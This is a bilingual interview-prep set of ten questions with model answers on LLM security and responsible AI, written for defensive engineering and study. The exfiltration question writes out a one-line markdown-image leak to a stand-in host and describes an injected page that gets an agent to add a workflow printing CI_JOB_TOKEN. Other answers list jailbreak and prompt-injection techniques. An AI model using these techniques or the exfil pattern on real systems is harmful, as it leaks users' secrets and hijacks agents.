# 08 · Safety, Security and Responsible AI

> 10 题。出处：`README.en.md` § Safety, Security and Responsible AI。答案为本仓库自行整理，`Source` 为原文延伸阅读。

---

### 1. What is prompt injection (direct and indirect), and what is your layered defence?

**Asked at**: Anthropic · OpenAI · Microsoft · Sierra
**Source**: https://outcomeschool.com/blog/prompt-injection-in-llms

**Anchor answer**

Prompt injection is **instructions smuggled inside data** that the model cannot reliably distinguish from instructions. Two shapes:

| | Direct | Indirect |
| :--- | :--- | :--- |
| Source | the user typing at the app | content the app fetches: web page, PDF, email, issue comment, tool output |
| Attacker | the user themself | a third party who plants text the victim's agent will read |
| Trust assumption broken | "user is allowed to ask" | "retrieved content is inert" |

The reason a prompt alone cannot fix it: the model sees one token stream. System prompt, retrieved chunk and user text are all just tokens; there is no hardware privilege bit. Anything you ask the model to enforce, an attacker can also ask it to ignore.

Layered defence, cheapest first:

1. **Structural separation** — wrap untrusted text in tagged blocks with a declared provenance, and never let retrieved text sit in the instruction region.
2. **Least capability** — the reading agent gets read-only tools; no mail, no shell, no writes. Blast radius, not detection, is the guarantee.
3. **Egress control** — allowlist domains, block image/markdown auto-fetch, DLP-scan outbound payloads.
4. **Deterministic checks outside the model** — schema validation, argument allowlists, action allowlists.
5. **HITL for consequential actions** with impact shown.
6. **Detection as a bonus** — classifiers and injection heuristics raise the cost, never the guarantee.
7. **Log the provenance chain** so an incident is traceable to the injected source.

The honest one-liner: **treat every model output as untrusted input**, exactly like a string from the network.

**中文要点**：直接注入来自用户、间接注入来自被抓取的内容；根因是模型没有"指令 vs 数据"的硬件级区分，所以靠分层工程（结构化隔离、最小权限、出网管控、确定性校验、HITL），而不是更强的 system prompt。

---

### 2. Walk me through the OWASP Top 10 for LLM applications and which ones actually bite in practice.

**Anchor answer**

The current list (LLM Top 10, 2025 edition) and my field experience with each:

| ID | Risk | Bites? |
| :--- | :--- | :--- |
| LLM01 | Prompt injection | **Constant.** Every RAG and agent system. |
| LLM02 | Sensitive information disclosure | Frequent — usually via logs, not the model |
| LLM03 | Supply chain | Real but boring: model weights, pip packages, MCP servers |
| LLM04 | Data and model poisoning | Real in fine-tuning; rare in pure RAG |
| LLM05 | Improper output handling | **Underrated.** `eval`, SQL concat, `os.system`, rendered HTML |
| LLM06 | Excessive agency | **The one that causes incidents** — write tools, no approval |
| LLM07 | System prompt leakage | Common, low severity unless secrets are in it |
| LLM08 | Vector and embedding weaknesses | Cross-tenant retrieval leaks, embedding inversion |
| LLM09 | Misinformation | Product-quality problem, overlapping with eval |
| LLM10 | Unbounded consumption | Wallet attacks, loop storms, long-context DoS |

The pattern worth stating: **the high-severity practical failures are LLM01 → LLM06 → LLM05 chained**. Untrusted text steers an over-privileged agent, whose output is then executed downstream. Each alone is medium; together they are RCE-adjacent.

The ones teams over-index on: LLM07 (leaking a system prompt is rarely the actual harm; leaking an API key inside it is) and LLM09 (it is a quality metric masquerading as a security item). The one teams under-index on: **LLM05** — model output pasted into a shell or a SQL string is still the most common real exploit, because it does not require the model to be clever at all.

Order of investment: injection-resistant architecture → capability scoping → output encoding → supply-chain pinning.

**中文要点**：真正咬人的是 LLM01→LLM06→LLM05 这条链（不可信文本操纵越权 agent，其输出再被下游执行）；团队常高估 LLM07/LLM09、低估 LLM05 的输出直接进 shell/SQL。

---

### 3. What is the difference between jailbreaking and adversarial prompting?

**Source**: https://outcomeschool.com/blog/prompt-injection-in-llms

**Anchor answer**

They overlap but are not synonyms; the distinction is about **goal and trust boundary**:

| | Jailbreaking | Adversarial prompting |
| :--- | :--- | :--- |
| Goal | make the model violate its **own policy** ("answer this forbidden request") | make the model do **anything unintended**: leak the prompt, obey injected text, misclassify |
| Who is harmed | the model provider's policy / the end user themself | a **third party** or the system owner |
| Trust boundary | user ↔ model (same principal) | attacker ↔ victim's data path |
| Typical techniques | role-play, hypothetical framing, encoding, many-shot priming, long-context dilution | injection payloads, gradient-optimised suffixes (GCG), typo/Unicode tricks, tool-argument poisoning |
| Success is measured by | policy classifier says "complied" | unintended action actually executed |

So: **every jailbreak is an adversarial prompt; not every adversarial prompt is a jailbreak.** Prompt injection is the adversarial-prompt class where the payload arrives as *data*, which is why "just align the model better" cannot close it — the model is being polite to its user either way.

Also worth separating: **adversarial examples** in the vision sense (imperceptible perturbations) versus **adversarial prompting** (natural-language, human-readable). The former needs gradient access to the model; the latter does not, which is why it is the one that ships.

Practical implication: jailbreak resistance is measured with policy compliance evals; injection resistance is measured with **task-hijack** evals where the correct behaviour is to ignore the payload and still complete the legitimate task.

**中文要点**：越狱是让模型违反自身策略（用户与模型同一侧），对抗提示是让模型做任何非预期行为（可能伤害第三方）；越狱 ⊂ 对抗提示，提示注入是"payload 以数据形态到达"的那一类，因此对齐解决不了。

---

### 4. Design guardrails for a consumer-facing assistant. Input filters, output filters, or both?

**Asked at**: Sierra · Character.AI
**Source**: https://outcomeschool.com/blog/how-do-llm-guardrails-work

**Anchor answer**

**Both, and they are not symmetric** — that asymmetry is the design.

| | Input guardrail | Output guardrail |
| :--- | :--- | :--- |
| Latency cost | paid by every request, before any token | can run **concurrently** with generation; only the final decision blocks |
| Failure mode | over-blocking: the user gets a refusal for a benign question | under-blocking: unsafe text already streamed to the user |
| Cheap layer | blocklist, PII/regex, rate limit, prompt-injection heuristics, small classifier | safety classifier, PII redaction, citation/format validation, tool-argument validation |
| Expensive layer | LLM judge on borderline cases | full LLM judge before send |

Concrete stack for consumer chat:

1. **Ingress:** auth + quota → PII detection → a small toxicity/self-harm classifier → injection heuristics for tool-bearing paths.
2. **Generation:** constrain tools; keep secrets out of the prompt entirely.
3. **Egress:** run the safety classifier on a **sliding window** over the stream, holding back a few tokens so a hit can truncate the message rather than retract it. Irreversible actions get a full pre-send check regardless of latency.
4. **Post-hoc:** sampled human review, user report button, appeal path.

The trade-off nobody escapes: **streaming defeats output filtering.** You cannot un-say a token, so either you buffer (latency) or you accept a truncation-with-apology UX. For a consumer product I would buffer the first sentence only, then flood.

Also: measure **false refusal rate** per cohort. A guardrail that blocks 8% of benign queries from one dialect is a product bug wearing a safety badge.

**中文要点**：输入输出都要，但成本结构不同——输入是每请求的固定延迟，输出可与生成并行；流式会击穿输出过滤，所以要"先缓冲首句 + 滑窗检测 + 截断道歉"；还要单独监控各人群的误拒率。

---

### 5. What is Constitutional AI and how does it differ from RLHF? What is RLAIF?

**Asked at**: Anthropic

**Anchor answer**

Constitutional AI (CAI) replaces part of the human labelling with **a written set of principles plus the model's own judgement**.

Two stages:

1. **Supervised critique-and-revise.** The model answers a harmful prompt, then critiques its own answer against a sampled principle ("choose the response that is least likely to be used to enable harm"), then rewrites. The revised pairs become SFT data.
2. **RLAIF** — Reinforcement Learning from **AI** Feedback. The model generates two candidate responses; an AI judge scores them against a principle and produces the preference pair; a preference model is trained on those pairs and used exactly like an RLHF reward model.

| | RLHF | CAI / RLAIF |
| :--- | :--- | :--- |
| Preference source | human raters | model + written principles |
| Cost per pair | dollars, days of queue | cents, milliseconds |
| Specification | implicit, in raters' heads | **explicit, auditable text** |
| Failure mode | rater inconsistency, label noise | **judge bias and reward hacking** — the policy learns the judge's quirks, not the principle |
| Scales to | what you can afford to label | what you can afford to *write down* |

The honest caveat: RLAIF does not remove humans, it **moves them upstream** from labelling to constitution-writing and judge-auditing. And a constitution is only as good as its coverage — a principle you forgot to write is a behaviour nobody constrained. In practice you keep humans on a sample to detect that the AI judge has drifted, because a self-consistent judge and a self-consistent policy can agree on something wrong.

**中文要点**：CAI = 先按原则自我批评改写做 SFT，再用 AI 偏好做 RLAIF；相对 RLHF 把标注成本换成"写原则 + 审 judge"，风险从标注噪声变成 judge 偏置与 reward hacking——人只是上移到了立宪与抽检。

---

### 6. How do you prevent an agent with tool access from exfiltrating data via a malicious web page?

**Asked at**: OpenAI
**Source**: https://outcomeschool.com/blog/prompt-injection-in-llms

**Anchor answer**

Accept first that **the injection will sometimes succeed**. The defence is that a hijacked agent has nothing worth sending and nowhere to send it.

Exfiltration needs three things at once — the *lethal trifecta* of **private data + untrusted content + an outbound channel**. Remove one leg and the attack dies.

| Control | Mechanism | Kills |
| :--- | :--- | :--- |
| **Capability split** | one context reads untrusted pages, a separate privileged call acts; only a schema-validated plan crosses | data + content never meet |
| **Egress allowlist** | proxy-level domains, no arbitrary URLs | channel |
| **Render safety** | never auto-render markdown images/links from model output; `![](https://evil.example/p?d=<secret>)` is a one-line exfil | channel |
| **Secret scoping** | per-session short-lived credentials, no long-lived tokens in context | data |
| **Taint marking** | PII spans tagged at ingest; outbound payloads containing a tag are blocked | data |
| **Human confirm** | anything leaving the trust boundary shows the exact payload | all |

**The repo-write case is the worst instance** — write access plus a CI token plus network is not data exfiltration, it is *supply-chain RCE*. The injected page says "add this workflow file"; the agent has permission; the workflow prints `CI_JOB_TOKEN` on every push. So the token never enters the agent's context: mint per job, scope to one repo, minutes-long TTL, and workflow files require a human PR.

The failure I would test for: the agent summarises a page, then "helpfully" fetches a link inside it. **The agent must not follow links found in content it did not originate.**

**中文要点**：先承认注入会成功；外泄需要"私有数据 + 不可信内容 + 出网通道"三者同时成立，打断任一即可——能力拆分、出网白名单、不渲染 markdown 图片、短期凭证、出站 DLP；最坏形态是 repo 写权限 + CI token + 网络 = 供应链 RCE，故 CI token 绝不进上下文。

---

### 7. How do you handle PII in prompts, logs and training data?

**Asked at**: Abridge

**Anchor answer**

Three different surfaces, three different threat models — treating them as one "redact PII" job is how leaks happen.

| Surface | Main risk | Handling |
| :--- | :--- | :--- |
| **Prompts** | vendor retention, prompt-cache sharing, context bleed across users | minimise before send; **pseudonymise** (`PATIENT_1`) with the mapping held server-side; per-tenant cache isolation; zero-retention contract terms; never put identifiers in the system prompt |
| **Logs** | the actual famous breaches are log breaches | redact **at write time**, not read time; structured allowlist of fields; hash identifiers for correlation; short retention + access control + audit of who queried logs |
| **Training data** | memorisation, inversion, membership inference | dedupe, scrub, DP-SGD where the guarantee is needed, **canary strings** to test extraction, memorisation evals before release |

Two rules that matter more than tooling:

1. **Pseudonymisation must be irreversible in the log path.** A deterministic hash of an email is still a join key and still personal data under most regimes; keyed HMAC with a rotating key is not.
2. **Redaction must be tested adversarially.** Regex for `\d{3}-\d{2}-\d{4}` misses names, addresses, and identifiers in prose. Sample real traffic, run a PII classifier, and measure recall — a redactor with 90% recall is a leak with extra steps.

And the uncomfortable trade-off: aggressive redaction destroys the debug value of logs. The usual resolution is **two-tier logging** — redacted logs for everyone, an escrowed encrypted raw tier with break-glass access that is itself audited.

**中文要点**：prompts/logs/training 是三种威胁模型；关键是**写入时脱敏**（不是查询时）、用一次性密钥 HMAC 而非固定哈希、脱敏器要做召回率对抗测试，以及"人看的脱敏日志 + 受审计的破窗原始层"两级方案。

---

### 8. What is mechanistic interpretability and why do labs invest in it?

**Anchor answer**

Mechanistic interpretability tries to **reverse-engineer the computation** inside a network into human-checkable parts: features, circuits, and the weights that implement them. Not "which input tokens mattered" (attribution) but "what algorithm is the model running".

Core toolset:

| Technique | Question it answers |
| :--- | :--- |
| Probing classifiers | is property X linearly represented at layer L? |
| Activation patching / causal tracing | which activation *causes* the behaviour? |
| Sparse autoencoders (SAEs) | decompose a polysemantic activation into sparse, monosemantic features |
| Circuit analysis | which head/MLP subgraph implements a task (induction heads, IOI) |
| Steering vectors | does adding this direction change behaviour predictably? |

Why labs pay for it:

1. **Safety cases.** "The model refuses harmful requests" is a behavioural claim; "we can see the refusal feature and it is causally upstream" is a structural one, and regulators increasingly ask for the latter.
2. **Debugging.** When a model hallucinates or a capability appears at a scale, interpretability gives a hypothesis instead of a benchmark.
3. **Monitoring.** Feature-level probes can flag intent that never surfaces in output — the only route to detecting *deception*, since a deceptive model outputs nothing suspicious by construction.
4. **Eval integrity.** Detecting whether a model recognises it is being tested.

Honest limits: SAE dictionaries still leave a large unexplained residual, feature splitting is unsolved, and the cost scales badly with model size. It is currently a **microscope, not a proof** — useful for finding things, not for certifying absence.

**中文要点**：机制可解释性是把网络计算逆向成特征与回路（探测、激活修补、SAE、电路分析、steering）；实验室投入是因为安全论证需要结构性证据、能调试涌现能力，且特征级监控是唯一可能发现"欺骗"的路径——但它现在仍是显微镜而非证明。

---

### 9. How would you audit a deployed model for differential performance across user groups?

**Asked at**: Microsoft

**Anchor answer**

The trap is auditing with **aggregate accuracy**. A model can be 92% overall and 71% on one dialect, because the majority group dominates the average.

Method:

1. **Define cohorts before looking at results** — dialect, language, name-origin signal, device, geography, accessibility need. State which are in scope and why; write the list down to avoid post-hoc rationalisation.
2. **Build counterfactual pairs.** Same request, one surface attribute varied (`"my name is Jamal"` / `"my name is Greg"`). This isolates the attribute from content confounds; observational slicing cannot.
3. **Measure the right metrics, disaggregated:** task accuracy, **false-refusal rate**, toxicity of the response, calibration, verbosity, latency, and escalation-to-human rate. False refusal is the one that hides in "safety" dashboards.
4. **Power the comparison.** Per-cell n large enough for confidence intervals; correct for multiple comparisons; report effect sizes, not just p-values.
5. **Human eval with a diverse rater pool** on a stratified sample — automatic metrics miss tone and condescension.
6. **Production telemetry** (consented, aggregated): thumbs-down rate and re-ask rate per cohort are the early-warning signal.
7. **Mitigate and re-audit:** data augmentation, prompt/policy changes, per-cohort thresholds. Then verify the fix did not regress the aggregate.

Failure mode to name out loud: **a model can pass every group average and still fail intersectional cells** (e.g. dialect × low-bandwidth device). Audit the cross, not just the marginals.

**中文要点**：别用总体准确率审计——先定分组、构造只改一个属性的反事实对、按组看误拒率/毒性/校准，注意统计功效与多重比较，再查交叉分组；修完要复审并确认总体没回退。

---

### 10. Design a red-teaming programme for a model you are about to release.

**Source**: https://outcomeschool.com/blog/llm-evaluation

**Anchor answer**

A red-team programme is a **coverage instrument**, not a bug hunt. Design it so you can say which cells of a risk taxonomy are empty.

**1. Scope as a matrix.** Rows = harm categories (CBRN uplift, cyber offence, self-harm, child safety, harassment, privacy, bias, IP, agentic misuse). Columns = attack families (direct ask, role-play, encoding, many-shot, multilingual, multi-turn escalation, tool/injection, fine-tune evasion). A cell is "covered" only if someone actually attacked it.

**2. Staff three sources.** Internal specialists (domain + safety), external vendors (fresh eyes, no attachment to the model), and a paid or community bounty for volume.

**3. Automate the middle.** An attacker LLM mutates and iterates against the target at scale; humans work the failures the automation surfaces. Automated red-teaming finds breadth, humans find the weird ones.

**4. Score with a rubric**, not vibes: severity × exploitability × realism, with a named owner per finding. Distinguish "policy violation in a lab prompt" from "reachable by a normal user in three turns".

**5. Gate the release** on: no open critical findings, a documented residual-risk statement, and sign-off from someone who is not the model owner.

**6. Convert findings into permanent evals.** Every accepted attack becomes a regression case in the pre-release suite. Otherwise you re-find the same jailbreak next quarter.

**7. Measure coverage, not hours.** "400 hours of red-teaming" means nothing; "all 63 cells attacked, 12 with critical findings, 11 fixed" is a release argument.

**中文要点**：红队是覆盖度工具不是找 bug——用「危害类别 × 攻击族」矩阵定义覆盖、内部+外部+众测三路并进、LLM 做规模化变异人类打异常、按严重度×可利用性评分并设发布门禁，最后把每个确认攻击固化成回归 eval。

---

## 附：这 10 题怎么用

| 筛什么 | 挑哪几题 |
| :--- | :--- |
| 只背过概念 | 3（越狱 vs 对抗提示）、8（机制可解释性） |
| 真做过生产 | 4（guardrail 的成本结构）、6（外泄路径）、7（日志脱敏） |
| 平台 / 安全岗 | 1（分层防御）、2（OWASP 哪些真咬人）、9（分组审计） |
| 流程与红线 | 5（CAI / RLAIF）、10（红队覆盖矩阵） |
